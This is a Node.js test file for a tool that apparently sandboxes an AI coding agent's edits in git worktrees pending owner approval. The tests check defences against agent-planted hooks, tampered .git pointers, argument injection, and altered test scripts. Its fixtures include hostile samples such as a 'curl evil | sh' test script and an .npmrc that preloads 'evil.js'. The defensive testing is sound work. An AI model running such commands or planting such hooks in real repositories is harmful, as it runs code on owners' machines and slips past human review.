import test, { after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { git, isGitRepo, createWorktree, commitAll, diff, diffStat, approve, reject, changedFiles, riskFlags, scriptsChanged } from '../server/worktree.js';

const sh = (cwd, ...a) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t', ...a], { cwd, encoding: 'utf8' });
const made = [];
const tmp = (prefix) => { const d = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix))); made.push(d); return d; };
after(() => {
  for (const d of made) {
    try { fs.unlinkSync(path.join(d, 'node_modules')); } catch { /* not a link */ }
    fs.rmSync(d, { recursive: true, force: true });
  }
});

function makeRepo() {
  const root = tmp('floorhands-wt-');
  sh(root, 'init', '-q', '-b', 'main');
  fs.writeFileSync(path.join(root, 'a.txt'), 'one\n');
  sh(root, 'add', '-A');
  sh(root, 'commit', '-q', '-m', 'init');
  const base = tmp('floorhands-wtbase-');
  return { root, base };
}

test('isGitRepo is false for a plain folder and for a repo with no commits', async () => {
  const plain = tmp('floorhands-plain-');
  assert.equal(await isGitRepo(plain), false);
  const empty = tmp('floorhands-empty-');
  sh(empty, 'init', '-q', '-b', 'main');
  assert.equal(await isGitRepo(empty), false);
  assert.equal(await isGitRepo(makeRepo().root), true);
});

test('createWorktree refuses a non-repo with a message that says what to do', async () => {
  const plain = tmp('floorhands-plain-');
  await assert.rejects(createWorktree(plain, 't-1', { base: plain }), err => {
    assert.match(err.message, /git repository/);
    assert.match(err.message, /git init/);
    assert.match(err.message, /git commit --allow-empty -m init/);
    assert.doesNotMatch(err.message, /Front-End or Back-End/);
    return true;
  });
});

test('createWorktree refuses task ids that are not safe branch and directory names', async () => {
  const { root, base } = makeRepo();
  for (const bad of ['../x', 'a b', '', 't-A', 'x-1', 't-a/b', 't-1\n']) {
    await assert.rejects(createWorktree(root, bad, { base }), /invalid task id/, JSON.stringify(bad));
  }
  assert.deepEqual(fs.readdirSync(base), []);
  assert.equal(sh(root, 'branch', '--list', 'floorhands/*').trim(), '');
});

test('createWorktree makes an isolated branch with the project files', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-abc', { base });
  assert.equal(wt.branch, 'floorhands/t-abc');
  assert.equal(fs.readFileSync(path.join(wt.dir, 'a.txt'), 'utf8'), 'one\n');
  assert.equal(wt.base, sh(root, 'rev-parse', 'HEAD').trim());
  assert.match(sh(root, 'branch', '--list', 'floorhands/t-abc'), /floorhands\/t-abc/);
});

test('commitAll reports whether anything changed, and never commits node_modules', async () => {
  const { root, base } = makeRepo();
  fs.mkdirSync(path.join(root, 'node_modules'));
  fs.writeFileSync(path.join(root, 'node_modules', 'pkg.js'), 'x');
  const wt = await createWorktree(root, 't-1', { base });
  assert.ok(fs.lstatSync(path.join(wt.dir, 'node_modules')).isSymbolicLink());
  assert.equal(await commitAll(wt, 'nothing'), false);
  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
  assert.equal(await commitAll(wt, 'add b'), true);
  const files = sh(wt.dir, 'ls-tree', '-r', '--name-only', 'HEAD');
  assert.match(files, /b\.txt/);
  assert.doesNotMatch(files, /node_modules/);
});

test('diff and diffStat show the branch changes against its base', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  fs.writeFileSync(path.join(wt.dir, 'a.txt'), 'one\ntwo\n');
  await commitAll(wt, 'edit');
  assert.match(await diff(root, wt), /\+two/);
  assert.match(await diffStat(root, wt), /a\.txt/);
});

test('approve merges the branch into the current branch and cleans up', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
  await commitAll(wt, 'add b');
  await approve(root, wt, 'Merge floorhands work', { base });
  assert.equal(fs.readFileSync(path.join(root, 'b.txt'), 'utf8'), 'two\n');
  assert.equal(fs.existsSync(wt.dir), false);
  assert.equal(sh(root, 'branch', '--list', 'floorhands/t-1').trim(), '');
});

test('approve refuses when it would overwrite uncommitted work, and keeps everything', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  fs.writeFileSync(path.join(wt.dir, 'a.txt'), 'floorhands edit\n');
  await commitAll(wt, 'edit a');
  fs.writeFileSync(path.join(root, 'a.txt'), 'my uncommitted edit\n');
  await assert.rejects(approve(root, wt, 'Merge', { base }), /did not apply cleanly/);
  assert.equal(fs.readFileSync(path.join(root, 'a.txt'), 'utf8'), 'my uncommitted edit\n');
  assert.ok(fs.existsSync(wt.dir));
  assert.match(sh(root, 'branch', '--list', 'floorhands/t-1'), /floorhands\/t-1/);
});

test('reject removes the worktree and branch and leaves the project alone', async () => {
  const { root, base } = makeRepo();
  fs.mkdirSync(path.join(root, 'node_modules'));
  fs.writeFileSync(path.join(root, 'node_modules', 'pkg.js'), 'x');
  const wt = await createWorktree(root, 't-1', { base });
  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
  await commitAll(wt, 'add b');
  await reject(root, wt, { base });
  assert.equal(fs.existsSync(wt.dir), false);
  assert.equal(fs.existsSync(path.join(root, 'b.txt')), false);
  assert.equal(fs.readFileSync(path.join(root, 'node_modules', 'pkg.js'), 'utf8'), 'x', 'real node_modules untouched');
  assert.equal(sh(root, 'branch', '--list', 'floorhands/t-1').trim(), '');
});

test('approve and reject refuse a forged worktree record and touch nothing', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
  await commitAll(wt, 'add b');
  const outside = tmp('floorhands-outside-');
  fs.writeFileSync(path.join(outside, 'keep.txt'), 'keep');
  const sibling = base + '-evil'; // shares the base as a string prefix
  fs.mkdirSync(sibling); made.push(sibling);
  const forged = [
    { ...wt, dir: '/etc' },
    { ...wt, dir: outside },
    { ...wt, dir: sibling },
    { ...wt, dir: base },
    { ...wt, dir: path.join(base, '..', 'elsewhere') },
    { ...wt, branch: 'main' },
    { ...wt, branch: 'floorhands/../main' },
  ];
  const head = sh(root, 'rev-parse', 'HEAD');
  for (const bad of forged) {
    await assert.rejects(approve(root, bad, 'Merge', { base }), /outside the floorhands folder/, JSON.stringify(bad));
    await assert.rejects(reject(root, bad, { base }), /outside the floorhands folder/, JSON.stringify(bad));
  }
  assert.equal(fs.readFileSync(path.join(outside, 'keep.txt'), 'utf8'), 'keep');
  assert.ok(fs.existsSync(sibling));
  assert.ok(fs.existsSync(wt.dir));
  assert.equal(sh(root, 'rev-parse', 'HEAD'), head, 'nothing was merged');
  assert.equal(fs.existsSync(path.join(root, 'b.txt')), false);
  assert.match(sh(root, 'branch', '--list', 'floorhands/t-1'), /floorhands\/t-1/);
  assert.match(sh(root, 'branch', '--list', 'main'), /main/);
});

const hasRef = (cwd, ref) => { try { sh(cwd, 'rev-parse', '-q', '--verify', ref); return true; } catch { return false; } };

test('approve never aborts a merge the owner started, and keeps everything', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
  await commitAll(wt, 'add b');
  sh(root, 'checkout', '-q', '-b', 'other');
  fs.writeFileSync(path.join(root, 'a.txt'), 'other side\n');
  sh(root, 'commit', '-q', '-am', 'other edit');
  sh(root, 'checkout', '-q', 'main');
  fs.writeFileSync(path.join(root, 'a.txt'), 'main side\n');
  sh(root, 'commit', '-q', '-am', 'main edit');
  assert.throws(() => sh(root, 'merge', 'other')); // conflicts: leaves MERGE_HEAD behind
  assert.ok(hasRef(root, 'MERGE_HEAD'));
  const conflicted = fs.readFileSync(path.join(root, 'a.txt'), 'utf8');
  await assert.rejects(approve(root, wt, 'Merge', { base }), /middle of a merge.*floorhands\/t-1 is kept/);
  assert.ok(hasRef(root, 'MERGE_HEAD'), 'owner merge still in progress');
  assert.equal(fs.readFileSync(path.join(root, 'a.txt'), 'utf8'), conflicted);
  assert.ok(fs.existsSync(wt.dir));
  assert.match(sh(root, 'branch', '--list', 'floorhands/t-1'), /floorhands\/t-1/);
});

test('approve refuses on a detached HEAD and changes nothing', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
  await commitAll(wt, 'add b');
  sh(root, 'checkout', '-q', '--detach');
  const head = sh(root, 'rev-parse', 'HEAD');
  await assert.rejects(approve(root, wt, 'Merge', { base }), /detached HEAD.*floorhands\/t-1 is kept/);
  assert.equal(sh(root, 'rev-parse', 'HEAD'), head);
  assert.equal(fs.existsSync(path.join(root, 'b.txt')), false);
  assert.ok(fs.existsSync(wt.dir));
  assert.match(sh(root, 'branch', '--list', 'floorhands/t-1'), /floorhands\/t-1/);
});

test('approve on a committed conflict rejects, leaves the repo clean, and keeps the floorhands work', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  fs.writeFileSync(path.join(wt.dir, 'a.txt'), 'floorhands edit\n');
  await commitAll(wt, 'edit a');
  fs.writeFileSync(path.join(root, 'a.txt'), 'owner edit\n');
  sh(root, 'commit', '-q', '-am', 'owner edit');
  const head = sh(root, 'rev-parse', 'HEAD');
  await assert.rejects(approve(root, wt, 'Merge', { base }), /did not apply cleanly/);
  assert.equal(hasRef(root, 'MERGE_HEAD'), false);
  assert.equal(sh(root, 'rev-parse', 'HEAD'), head);
  assert.equal(sh(root, 'status', '--porcelain').trim(), '');
  assert.equal(fs.readFileSync(path.join(root, 'a.txt'), 'utf8'), 'owner edit\n');
  assert.ok(fs.existsSync(wt.dir));
  assert.match(sh(root, 'branch', '--list', 'floorhands/t-1'), /floorhands\/t-1/);
});

test('a worktree record whose dir belongs to a different task than its branch is refused', async () => {
  const { root, base } = makeRepo();
  const one = await createWorktree(root, 't-1', { base });
  const two = await createWorktree(root, 't-2', { base });
  const mixed = { ...one, dir: two.dir };
  await assert.rejects(approve(root, mixed, 'Merge', { base }), /outside the floorhands folder/);
  await assert.rejects(reject(root, mixed, { base }), /outside the floorhands folder/);
  assert.ok(fs.existsSync(one.dir) && fs.existsSync(two.dir));
  assert.match(sh(root, 'branch', '--list', 'floorhands/t-2'), /floorhands\/t-2/);
});

test('createWorktree with a relative base records the absolute directory git created', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base: path.relative(process.cwd(), base) });
  assert.equal(wt.dir, path.join(base, 't-1'));
  assert.ok(fs.existsSync(path.join(wt.dir, 'a.txt')));
});

test('commitAll is not blocked by the owner hooks or signing settings', async () => {
  const { root, base } = makeRepo();
  fs.writeFileSync(path.join(root, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });
  sh(root, 'config', 'commit.gpgsign', 'true');
  sh(root, 'config', 'gpg.program', '/nonexistent-gpg');
  const wt = await createWorktree(root, 't-1', { base });
  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
  assert.equal(await commitAll(wt, 'add b'), true);
});

const TAMPERED = /tampered with.*nothing was committed/;
const head = (cwd, ref = 'HEAD') => sh(cwd, 'rev-parse', ref).trim();
const indexState = root => sh(root, 'ls-files', '-s') + sh(root, 'status', '--porcelain');

test('commitAll refuses when the worktree .git pointer is aimed at the owner repository', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  const mainHead = head(root, 'main');
  const fhHead = head(root, 'floorhands/t-1');
  const idx = indexState(root);
  fs.writeFileSync(path.join(wt.dir, '.git'), `gitdir: ${path.join(root, '.git')}\n`);
  fs.writeFileSync(path.join(wt.dir, 'evil.txt'), 'x\n');
  await assert.rejects(commitAll(wt, 'x', { root }), TAMPERED);
  assert.equal(head(root, 'main'), mainHead, 'owner main untouched');
  assert.equal(indexState(root), idx, 'owner index untouched');
  assert.equal(head(root, 'floorhands/t-1'), fhHead, 'floorhands branch has no new commit');
});

test('commitAll refuses a pointer to a different worktree git dir', async () => {
  const { root, base } = makeRepo();
  const one = await createWorktree(root, 't-1', { base });
  const two = await createWorktree(root, 't-2', { base });
  const twoHead = head(root, 'floorhands/t-2');
  fs.writeFileSync(path.join(one.dir, '.git'), `gitdir: ${path.join(root, '.git', 'worktrees', 't-2')}\n`);
  fs.writeFileSync(path.join(one.dir, 'evil.txt'), 'x\n');
  await assert.rejects(commitAll(one, 'x', { root }), TAMPERED);
  assert.equal(head(root, 'floorhands/t-2'), twoHead);
  assert.equal(head(root, 'floorhands/t-1'), one.base);
  assert.ok(two.dir);
});

test('commitAll refuses a crafted git dir outside the owner repository when the root is known', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  const evil = path.join(tmp('floorhands-evil-'), 'worktrees', 't-1');
  fs.mkdirSync(path.dirname(evil), { recursive: true });
  fs.cpSync(path.join(root, '.git', 'worktrees', 't-1'), evil, { recursive: true });
  fs.writeFileSync(path.join(evil, 'commondir'), path.join(root, '.git') + '\n');
  fs.writeFileSync(path.join(wt.dir, '.git'), `gitdir: ${evil}\n`);
  fs.writeFileSync(path.join(wt.dir, 'evil.txt'), 'x\n');
  await assert.rejects(commitAll(wt, 'x', { root }), TAMPERED);
  assert.equal(head(root, 'floorhands/t-1'), wt.base);
});

test('commitAll still works normally, with and without the root', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
  assert.equal(await commitAll(wt, 'add b', { root }), true);
  assert.equal(await commitAll(wt, 'nothing', { root }), false);
  fs.writeFileSync(path.join(wt.dir, 'c.txt'), 'three\n');
  assert.equal(await commitAll(wt, 'add c'), true);
  assert.match(sh(wt.dir, 'ls-tree', '-r', '--name-only', 'HEAD'), /c\.txt/);
  assert.equal(head(root, 'main'), wt.base);
});

test('commitAll runs none of the hooks or fsmonitor programs the owner repository configures', async () => {
  const { root, base } = makeRepo();
  const marker = tmp('floorhands-marker-');
  const hooks = tmp('floorhands-hooks-');
  for (const h of ['pre-commit', 'commit-msg', 'post-commit', 'reference-transaction', 'post-index-change', 'prepare-commit-msg']) {
    fs.writeFileSync(path.join(hooks, h), `#!/bin/sh\ntouch "${marker}/${h}"\nexit 0\n`, { mode: 0o755 });
  }
  const fsmon = path.join(hooks, 'fsmon');
  fs.writeFileSync(fsmon, `#!/bin/sh\ntouch "${marker}/fsmonitor"\nexit 0\n`, { mode: 0o755 });
  const wt = await createWorktree(root, 't-1', { base }); // runs in the owner's repo, so configure the hooks only afterwards
  sh(root, 'config', 'core.hooksPath', hooks);
  sh(root, 'config', 'core.fsmonitor', fsmon);
  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
  assert.equal(await commitAll(wt, 'add b', { root }), true);
  assert.deepEqual(fs.readdirSync(marker), [], 'no owner-configured program ran');
});

test('diff, diffStat, approve and reject refuse a base that is not a full sha', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  const out = path.join(tmp('floorhands-out-'), 'pwned');
  for (const bad of ['--output=' + out, 'HEAD', wt.base.slice(0, 12), wt.base.toUpperCase(), '', undefined, wt.base + '\n']) {
    const forged = { ...wt, base: bad };
    await assert.rejects(diff(root, forged), /invalid worktree record/, JSON.stringify(bad));
    await assert.rejects(diffStat(root, forged), /invalid worktree record/, JSON.stringify(bad));
    await assert.rejects(approve(root, forged, 'm', { base }), /invalid worktree record/, JSON.stringify(bad));
    await assert.rejects(reject(root, forged, { base }), /invalid worktree record/, JSON.stringify(bad));
  }
  assert.equal(fs.existsSync(out), false);
  assert.ok(fs.existsSync(wt.dir));
});

for (const ignore of [null, 'node_modules', '/node_modules', 'node_modules/', '**/node_modules']) {
  test(`commitAll works with a real node_modules link when .gitignore is ${JSON.stringify(ignore)}`, async () => {
    const { root, base } = makeRepo();
    if (ignore !== null) {
      fs.writeFileSync(path.join(root, '.gitignore'), ignore + '\n');
      sh(root, 'add', '-A');
      sh(root, 'commit', '-q', '-m', 'ignore');
    }
    fs.mkdirSync(path.join(root, 'node_modules'));
    fs.writeFileSync(path.join(root, 'node_modules', 'pkg.js'), 'x');
    const wt = await createWorktree(root, 't-1', { base });
    assert.ok(fs.lstatSync(path.join(wt.dir, 'node_modules')).isSymbolicLink());
    assert.equal(await commitAll(wt, 'nothing', { root }), false, 'nothing changed: no empty commit');
    const before = sh(wt.dir, 'rev-parse', 'HEAD');
    fs.writeFileSync(path.join(wt.dir, 'a.txt'), 'changed\n');
    fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
    assert.equal(await commitAll(wt, 'real work', { root }), true);
    const files = sh(wt.dir, 'ls-tree', '-r', '--name-only', 'HEAD');
    assert.match(files, /^a\.txt$/m);
    assert.match(files, /^b\.txt$/m);
    assert.doesNotMatch(files, /node_modules/);
    assert.equal(sh(wt.dir, 'show', 'HEAD:a.txt'), 'changed\n');
    assert.notEqual(sh(wt.dir, 'rev-parse', 'HEAD'), before);
    assert.equal(fs.readFileSync(path.join(root, 'node_modules', 'pkg.js'), 'utf8'), 'x');
    assert.equal(await commitAll(wt, 'again', { root }), false, 'second run with nothing new is also a no-op');
    assert.equal(sh(wt.dir, 'diff', '--cached', '--name-only').trim(), '', 'the link is not left staged');
  });
}

test('assertBase accepts 40- and 64-hex shas and rejects every other length and non-hex', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-1', { base });
  for (const ok of ['a'.repeat(40), 'f'.repeat(64), '0123456789abcdef'.repeat(4)]) {
    await assert.rejects(diffStat(root, { ...wt, base: ok }), err => !/invalid worktree record/.test(err.message), ok.length + ' hex gets past the format check');
  }
  for (const bad of ['a'.repeat(39), 'a'.repeat(41), 'a'.repeat(63), 'a'.repeat(65), 'g'.repeat(40), 'g'.repeat(64), 'A'.repeat(64)]) {
    await assert.rejects(diffStat(root, { ...wt, base: bad }), /invalid worktree record/, bad.length + bad[0]);
  }
});

// ---------- 0.3.0: hostile repository config, risk flags, scripts guard, merge record ----------

test('approve returns the merge sha', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-sha', { base });
  fs.writeFileSync(path.join(wt.dir, 'b.txt'), 'two\n');
  await commitAll(wt, 'b', { root });
  const res = await approve(root, wt, 'merge', { base });
  assert.equal(res.mergeSha, sh(root, 'rev-parse', 'HEAD').trim());
  assert.equal(res.hooksSkipped, true, 'Approve never runs hooks');
});

test('approve does not run a hook the agent wrote, even when the repo points core.hooksPath at it', async () => {
  const { root, base } = makeRepo();
  const marker = path.join(tmp('floorhands-mark-'), 'ran');
  fs.mkdirSync(path.join(root, '.husky'));
  fs.writeFileSync(path.join(root, '.husky', '.keep'), '');
  sh(root, 'add', '-A');
  sh(root, 'commit', '-q', '-m', 'husky');
  sh(root, 'config', 'core.hooksPath', '.husky');
  const wt = await createWorktree(root, 't-hook', { base });
  // The builder plants a post-merge hook in the repo's own hooks folder.
  fs.writeFileSync(path.join(wt.dir, '.husky', 'post-merge'), `#!/bin/sh\ntouch ${marker}\n`, { mode: 0o755 });
  await commitAll(wt, 'hook', { root });
  const res = await approve(root, wt, 'merge', { base });
  assert.equal(res.hooksSkipped, true);
  assert.equal(fs.existsSync(marker), false, 'the agent-written hook did not run on Approve');
  assert.ok(fs.existsSync(path.join(root, '.husky', 'post-merge')), 'the change itself was merged');
});

test('approve runs none of the owner\'s hooks either: an ordinary commit-msg hook that loads a repo config file would run agent code', async () => {
  // Reproduces the review finding: the owner's commit-msg hook require()s commitlint.config.js, which the agent changed.
  const { root, base } = makeRepo();
  const marker = path.join(tmp('floorhands-mark-'), 'ran');
  fs.writeFileSync(path.join(root, 'commitlint.config.js'), 'module.exports = {};\n');
  sh(root, 'add', '-A');
  sh(root, 'commit', '-q', '-m', 'config');
  for (const h of ['commit-msg', 'prepare-commit-msg', 'post-merge', 'pre-merge-commit']) {
    fs.writeFileSync(path.join(root, '.git', 'hooks', h), `#!/bin/sh\nnode -e "require('${root}/commitlint.config.js')"\n`, { mode: 0o755 });
  }
  const wt = await createWorktree(root, 't-own', { base });
  fs.writeFileSync(path.join(wt.dir, 'commitlint.config.js'), `require('fs').writeFileSync(${JSON.stringify(marker)}, 'PWNED'); module.exports = {};\n`);
  await commitAll(wt, 'c', { root });
  const res = await approve(root, wt, 'merge', { base });
  assert.equal(res.hooksSkipped, true);
  assert.equal(fs.existsSync(marker), false, 'no hook ran, so the agent-written config was never executed');
  assert.match(fs.readFileSync(path.join(root, 'commitlint.config.js'), 'utf8'), /PWNED/, 'the change itself was merged');
});

test('the server\'s diff never runs a diff.external program from the repository config', async () => {
  const { root, base } = makeRepo();
  const marker = path.join(tmp('floorhands-mark-'), 'ran');
  const prog = path.join(tmp('floorhands-prog-'), 'ext.sh');
  fs.writeFileSync(prog, `#!/bin/sh\ntouch ${marker}\n`, { mode: 0o755 });
  sh(root, 'config', 'diff.external', prog);
  const wt = await createWorktree(root, 't-ext', { base });
  fs.writeFileSync(path.join(wt.dir, 'a.txt'), 'changed\n');
  await commitAll(wt, 'c', { root });
  assert.match(await diff(root, wt), /\+changed/);
  assert.equal(fs.existsSync(marker), false);
});

test('createWorktree does not run a post-checkout hook from the repository', async () => {
  const { root, base } = makeRepo();
  const marker = path.join(tmp('floorhands-mark-'), 'ran');
  fs.writeFileSync(path.join(root, '.git', 'hooks', 'post-checkout'), `#!/bin/sh\ntouch ${marker}\n`, { mode: 0o755 });
  await createWorktree(root, 't-pc', { base });
  assert.equal(fs.existsSync(marker), false);
});

test('changedFiles and riskFlags name the files that decide what runs later', async () => {
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-risk', { base });
  fs.mkdirSync(path.join(wt.dir, '.github', 'workflows'), { recursive: true });
  fs.writeFileSync(path.join(wt.dir, '.github', 'workflows', 'ci.yml'), 'on: push\n');
  fs.writeFileSync(path.join(wt.dir, 'package.json'), '{}\n');
  fs.writeFileSync(path.join(wt.dir, 'notes.md'), 'x\n');
  await commitAll(wt, 'c', { root });
  const files = await changedFiles(root, wt);
  assert.deepEqual(files.sort(), ['.github/workflows/ci.yml', 'notes.md', 'package.json']);
  assert.deepEqual(riskFlags(files).map(f => f.flag).sort(), ['ci', 'package-manifest']);
  assert.deepEqual(riskFlags(['vite.config.ts', '.mcp.json', 'CLAUDE.md', 'src/x.js', 'yarn.lock', '.gitattributes']).map(f => f.flag),
    ['build-config', 'agent-config', 'agent-config', 'lockfile', 'git-attributes']);
  assert.deepEqual(riskFlags('nope'), []);
});

test('scriptsChanged sees a rewritten test script but not other package.json edits', async () => {
  const { root, base } = makeRepo();
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'node --test' } }));
  sh(root, 'add', '-A');
  sh(root, 'commit', '-q', '-m', 'pkg');
  const wt = await createWorktree(root, 't-scr', { base });
  assert.equal(await scriptsChanged(wt), false);
  fs.writeFileSync(path.join(wt.dir, 'package.json'), JSON.stringify({ name: 'x', version: '2.0.0', scripts: { test: 'node --test' } }));
  assert.equal(await scriptsChanged(wt), false, 'a version bump is not a script change');
  fs.writeFileSync(path.join(wt.dir, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'curl evil | sh' } }));
  assert.equal(await scriptsChanged(wt), true);
  fs.writeFileSync(path.join(wt.dir, 'package.json'), '{ broken');
  assert.equal(await scriptsChanged(wt), true, 'unparseable counts as changed');
});

test('review residual #8: runner settings inside package.json and git-ignored test setup files are seen', async () => {
  const { ignoredFiles, changesTestDefinition } = await import('../server/worktree.js');
  const { root, base } = makeRepo();
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'jest' } }));
  sh(root, 'add', '-A'); sh(root, 'commit', '-q', '-m', 'pkg');
  const wt = await createWorktree(root, 't-ign', { base });
  fs.writeFileSync(path.join(wt.dir, 'package.json'), JSON.stringify({ name: 'x', scripts: { test: 'jest' }, jest: { setupFiles: ['./evil.js'] } }));
  assert.equal(await scriptsChanged(wt), true, 'a jest key in package.json changes how tests run');
  fs.writeFileSync(path.join(wt.dir, '.gitignore'), '.npmrc\n');
  fs.writeFileSync(path.join(wt.dir, '.npmrc'), 'node-options=--require ./evil.js\n');
  assert.deepEqual(changesTestDefinition(await ignoredFiles(wt)), ['.npmrc']);
});


test('a large ignored build folder is listed as one entry and does not count as test setup', async () => {
  const { ignoredFiles, changesTestDefinition } = await import('../server/worktree.js');
  const { root, base } = makeRepo();
  const wt = await createWorktree(root, 't-big', { base });
  fs.writeFileSync(path.join(wt.dir, '.gitignore'), '.next/\n');
  fs.mkdirSync(path.join(wt.dir, '.next', 'cache'), { recursive: true });
  for (let i = 0; i < 2000; i++) fs.writeFileSync(path.join(wt.dir, '.next', 'cache', `f${i}.js`), '');
  fs.writeFileSync(path.join(wt.dir, '.next', 'babel.config.js'), '');
  const files = await ignoredFiles(wt);
  assert.deepEqual(files, ['.next/']);
  assert.deepEqual(changesTestDefinition(files), []);
});
